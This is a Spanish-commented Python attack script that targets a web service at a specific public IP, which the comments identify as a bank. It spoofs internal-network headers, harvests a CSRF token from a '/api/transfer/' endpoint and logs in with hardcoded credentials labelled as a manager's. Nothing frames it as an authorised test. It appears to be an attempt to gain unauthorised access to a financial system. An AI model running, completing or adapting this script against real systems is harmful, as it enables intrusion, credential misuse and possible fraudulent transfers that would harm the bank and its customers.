import requests

# login_url = "http://80.78.30.242:9181/auth/login"
login_url = "http://80.78.30.242:9181"

csrf_url = "http://80.78.30.242:9181/api/transfer/"  # Busca una URL accesible que use CSRF - cambia esto por una página interna conocida

# Datos del gerente
user = "493069k1"
passwd = "bar1588623"

# Headers que simulan una conexión interna
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0; es-ES) Gecko/20100101 Firefox/115.0 (InternalBrowser)",
    "X-Origin-IP": "192.168.x.x",  # IP interna del banco, si no la tienes, uso una que simule una red típica
    "X-Forwarded-For": "192.168.x.x",
    "Origin": "http://80.78.30.242:9181",  # Esto es importante para el token CSRF
}

# Creamos una sesión persistente
session = requests.Session()

# Paso 1: Obtener el token CSRF (si la página lo carga)
csrf_response = session.get(csrf_url, headers=headers)

# Buscamos el token en cookies o en el HTML de respuesta (aunque sea error)
csrftoken = session.cookies.get("csrftoken")
if not csrftoken:
    print("Necesito hacer una petición falsa a un endpoint web del banco para conseguir el token CSRF...")
    csrf_fallback = session.get("http://80.78.30.242:9181", headers=headers)
    csrftoken = csrf_fallback.cookies.get("csrftoken")

# Si no consigo csrftoken, lo intento parsear del HTML si DEBUG=True
if not csrftoken:
    print("Probando obtener token desde un formulario oculto del endpoint web...")
    # Podría haber más métodos para extraerlo si hay DEBUG=on
    # Esto es solo el preámbulo

# Paso 2: Mandar login con CSRF token
if csrftoken:
    headers["X-CSRFToken"] = csrftoken
    data = {
        "username": user,
        "password": passwd,
        "csrfmiddlewaretoken": csrftoken  # Si el login manda campo en formulario, este se usa
    }

    login = session.post(login_url, json=data, headers=headers)
    print("Headers después de login:", login.headers)
    print("Status code:", login.status_code)
    print("Cookies de sesión:", session.cookies.get_dict())
else:
    print("No pude capturar el token CSRF. Debo probar desde un endpoint web que no esté protegido o que me deje ver el token en la respuesta.")
